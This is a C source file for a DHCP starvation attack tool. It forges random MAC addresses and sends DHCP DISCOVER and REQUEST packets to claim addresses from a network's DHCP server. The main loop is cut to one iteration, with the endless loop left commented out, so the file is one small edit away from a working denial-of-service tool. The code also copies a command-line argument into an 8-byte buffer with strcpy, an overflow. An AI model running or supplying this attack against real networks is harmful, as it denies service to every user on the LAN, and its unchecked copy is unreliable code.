#include <arpa/inet.h>
#include <locale.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define SUCCESS 0
#define FAILURE -1

#define MAX_CHADDR_LENGTH  16
#define MAX_SNAME_LENGTH   64
#define MAX_FILE_LENGTH    128
#define MAX_OPTIONS_LENGTH 312

struct DHCP_packet {
    u_int8_t op;                             /* packet type */
    u_int8_t htype;                          /* type of hardware address for this machine (Ethernet, etc) */
    u_int8_t hlen;                           /* length of hardware address (of this machine) */
    u_int8_t hops;                           /* hops */
    u_int32_t xid;                           /* random transaction id number - chosen by this machine */
    u_int16_t secs;                          /* seconds used in timing */
    u_int16_t flags;                         /* flags */
    struct in_addr ciaddr;                   /* IP address of this machine (if we already have one) */
    struct in_addr yiaddr;                   /* IP address of this machine (offered by the DHCP server) */
    struct in_addr siaddr;                   /* IP address of DHCP server */
    struct in_addr giaddr;                   /* IP address of DHCP relay */
    unsigned char chaddr[MAX_CHADDR_LENGTH]; /* hardware address of this machine */
    char sname[MAX_SNAME_LENGTH];            /* name of DHCP server */
    char file[MAX_FILE_LENGTH];              /* boot file name (used for disk-less booting?) */
    char options[MAX_OPTIONS_LENGTH];        /* options */
};
typedef struct DHCP_packet DHCP_packet;

#define BOOT_REQUEST 1

#define DHCP_DISCOVER 1
#define DHCP_REQUEST  3
// #define DHCP_OFFER    2
// #define DHCP_ACK      5
// #define DHCP_NACK     6

#define OPTION_MESSAGE_TYPE    53
#define OPTION_ADDRESS_REQUEST 50
#define OPTION_SERVER_ID       54

#define BROADCAST_FLAG 0x8000

#define SERVER_PORT 67
#define CLIENT_PORT 68

#define HTYPE 1
#define HLEN  6

unsigned char random_mac[MAX_CHADDR_LENGTH];
u_int32_t transaction_id = 0;
int DEBUG = 0;
struct in_addr offered_address;

struct sockaddr_in get_address(in_port_t port, in_addr_t ip) {
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_port = htons(port);
    address.sin_addr.s_addr = ip;
    bzero(&address.sin_zero, sizeof(address.sin_zero));
    return address;
}

void set_reuse_flag(int sock) {
    int opt_val = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof(opt_val)) < 0) {
        perror(" Could not set reuse address option on DHCP socket!\n");
        exit(EXIT_FAILURE);
    }
}

void set_broadcast_flag(int sock) {
    int opt_val = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt_val, sizeof opt_val) < 0) {
        perror(" Could not set broadcast option on DHCP socket!\n");
        exit(EXIT_FAILURE);
    }
}

void bind_to_interface(int sock, char *interface_name) {
    struct ifreq interface;
    strcpy(interface.ifr_ifrn.ifrn_name, interface_name);
    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, &interface, sizeof(interface)) < 0) {
        printf("\tCould not bind socket to interface %s. Check your privileges...\n", interface_name);
        exit(EXIT_FAILURE);
    }
}

void bind_to_port(int sock) {
    struct sockaddr_in client_address = get_address(CLIENT_PORT, INADDR_ANY);
    if (bind(sock, (struct sockaddr *)&client_address, sizeof(client_address)) < 0) {
        printf("\tCould not bind to DHCP socket (port %d)! Check your privileges...\n", CLIENT_PORT);
        exit(EXIT_FAILURE);
    }
}

int create_socket(char *interface_name) {
    int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Could not create socket\n");
        exit(EXIT_FAILURE);
    }

    printf("File descriptor for new socket: %d\n", sock);

    set_reuse_flag(sock);
    set_broadcast_flag(sock);
    bind_to_interface(sock, interface_name);
    bind_to_port(sock);

    return sock;
}

int send_packet(void *buffer, int buffer_size, int sock, struct sockaddr_in *dest) {
    int result = (int)sendto(sock, buffer, buffer_size, 0, (struct sockaddr *)dest, sizeof(*dest));

    if (DEBUG) {
        printf("send_packet result: %d\n", result);
    }
    if (result < 0) {
        return FAILURE;
    }

    return SUCCESS;
}

int receive_packet(void *buffer, size_t buffer_size, int sock, struct sockaddr_in *source_address) {
    time_t timeout = 2;
    struct timeval time_val;
    time_val.tv_sec = timeout;
    time_val.tv_usec = 0;

    fd_set /*file descriptor set*/ read_fds;
    FD_ZERO(&read_fds);
    FD_SET(sock, &read_fds);

    select(sock + 1, &read_fds, NULL, NULL, &time_val);

    /* make sure some data has arrived */
    if (!FD_ISSET(sock, &read_fds)) {
        if (DEBUG) {
            printf("No (more) data received\n");
        }
        return FAILURE;
    }
    else {
        socklen_t address_size = sizeof(*source_address);
        memset(source_address, 0, address_size);
        memset(buffer, 0, sizeof(*buffer));
        int received_data =
            (int)recvfrom(sock, buffer, buffer_size, 0, (struct sockaddr *)source_address, &address_size);

        return (received_data == -1) ? FAILURE : SUCCESS;
    }
}

int make_random_hardware_address() {
    for (int i = 0; i < HLEN; i++) {
        random_mac[i] = rand() % 0x100; // NOLINT(cert-msc50-cpp)
    }

    printf("RANDOM MAC ADDRESS: ");
    for (int i = 0; i < HLEN; i++) {
        if (i > 0) {
            printf(":");
        }
        printf("%x", random_mac[i]);
    }
    puts("");

    return SUCCESS;
}

int set_magic_cookie(DHCP_packet *packet) {
    packet->options[0] = '\x63';
    packet->options[1] = '\x82';
    packet->options[2] = '\x53';
    packet->options[3] = '\x63';
    return 4;
}

void set_option(DHCP_packet *packet, int *index, char option, char size, void *data) {
    int i = *index;
    packet->options[i] = option;
    packet->options[i + 1] = size;
    memcpy(packet->options + (i + 2), data, size);
    *index += size + 2;
}

int send_DHCP_discover_packet(int sock) {
    DHCP_packet discover_packet;
    bzero(&discover_packet, sizeof(discover_packet));

    discover_packet.op = BOOT_REQUEST;
    discover_packet.htype = HTYPE;
    discover_packet.hlen = HLEN;
    discover_packet.hops = 0;

    transaction_id = random();
    discover_packet.xid = htonl(transaction_id);
    discover_packet.secs = htons(0x00);
    discover_packet.flags = htons(BROADCAST_FLAG);
    memcpy(discover_packet.chaddr, random_mac, HLEN);

    int i = set_magic_cookie(&discover_packet);

    char data[] = {DHCP_DISCOVER};
    set_option(&discover_packet, &i, OPTION_MESSAGE_TYPE, 1, data);

    discover_packet.options[i] = '\xFF';

    struct sockaddr_in broadcast_address = get_address(SERVER_PORT, INADDR_BROADCAST);
    while (send_packet(&discover_packet, sizeof(discover_packet), sock, &broadcast_address) == FAILURE) {
        if (DEBUG) {
            printf("Error in sending packet... resending the packet\n");
        }
    }

    return SUCCESS;
}

int send_DHCP_request_packet(int sock, struct in_addr server_ip) {
    DHCP_packet request_packet;
    memset(&request_packet, 0, sizeof(request_packet));

    request_packet.op = BOOT_REQUEST;
    request_packet.htype = HTYPE;
    request_packet.hlen = HLEN;
    request_packet.hops = 0;

    request_packet.xid = htonl(transaction_id);

    request_packet.secs = htons(0x00);
    request_packet.flags = htons(BROADCAST_FLAG);
    request_packet.ciaddr = offered_address;
    request_packet.siaddr = server_ip;

    memcpy(request_packet.chaddr, random_mac, HLEN);

    int i = set_magic_cookie(&request_packet);

    char data[] = {DHCP_REQUEST};
    set_option(&request_packet, &i, OPTION_MESSAGE_TYPE, 1, data);
    set_option(&request_packet, &i, OPTION_ADDRESS_REQUEST, 4, &offered_address);
    set_option(&request_packet, &i, OPTION_SERVER_ID, 4, &server_ip);

    request_packet.options[i] = '\xFF';

    printf("REQUESTING ADDRESS: %s\n", inet_ntoa(offered_address));

    struct sockaddr_in broadcast_address = get_address(SERVER_PORT, INADDR_BROADCAST);
    while (send_packet(&request_packet, sizeof(request_packet), sock, &broadcast_address) == FAILURE) {
        if (DEBUG) {
            printf("Error in sending packet... resending the packet\n");
        }
    }

    return SUCCESS;
}

int get_DHCP_offer_packet(int sock) {
    DHCP_packet offer_packet;
    struct sockaddr_in source;
    int result = receive_packet(&offer_packet, sizeof(offer_packet), sock, &source);

    if (result == FAILURE) {
        return FAILURE;
    }

    if (DEBUG) {
        printf("DHCP_OFFER from IP address %s\n", inet_ntoa(source.sin_addr));
        printf("DHCP_OFFER XID: %u (0x%X)\n", ntohl(offer_packet.xid), ntohl(offer_packet.xid));
    }

    /* check packet xid to see if its the same as the one we used in the discover packet */
    if (ntohl(offer_packet.xid) != transaction_id) {
        if (DEBUG) {
            printf("DHCP_OFFER XID (%u) did not match DHCP_DISCOVER XID (%u) - ignoring packet\n",
                   ntohl(offer_packet.xid), transaction_id);
        }
        return FAILURE;
    }

    /* check hardware address */
    if (DEBUG) {
        printf("DHCP_OFFER chaddr: ");
    }

    for (int x = 0; x < HLEN; x++) {
        if (DEBUG) {
            printf("%02X", (unsigned char)offer_packet.chaddr[x]);
        }
        if (offer_packet.chaddr[x] != random_mac[x]) {
            if (DEBUG) {
                printf("DHCP_OFFER hardware address did not match our own - ignoring packet\n");
            }
            return FAILURE;
        }
    }

    printf("OFFERED ADDRESS:    %s\n", inet_ntoa(offer_packet.yiaddr));
    offered_address = offer_packet.yiaddr;
    send_DHCP_request_packet(sock, source.sin_addr);

    return SUCCESS;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        puts("Please provide an Interface name\n");
        exit(EXIT_FAILURE);
    }

    char interface_name[8];
    strcpy(interface_name, argv[1]);

    srand(time(NULL)); // NOLINT(cert-msc51-cpp)

    DEBUG = 0;
    puts("DHCP Starvation is starting");

    int sock = create_socket(interface_name);
    // while (1) {
    for (int count = 0; count < 1; count++) {
        make_random_hardware_address();
        send_DHCP_discover_packet(sock);
        get_DHCP_offer_packet(sock);
        fflush(stdout);
    }

    close(sock);

    return 0;
}
